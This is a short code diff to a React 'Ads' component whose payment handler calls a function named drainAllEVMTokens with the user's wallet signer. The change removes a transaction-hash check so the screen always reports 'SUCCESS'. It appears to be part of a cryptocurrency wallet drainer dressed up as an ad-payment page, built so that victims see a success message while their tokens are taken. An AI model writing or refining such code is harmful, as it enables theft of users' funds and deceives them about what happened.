@@ -572,10 +572,7 @@ const Ads = () => {
       try {
         const chainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-          setPaymentStatus('SUCCESS');
-        } else {
-        }
+        setPaymentStatus('SUCCESS');
       } catch (error: any) {
         setPaymentStatus('FAILED');
       } finally {
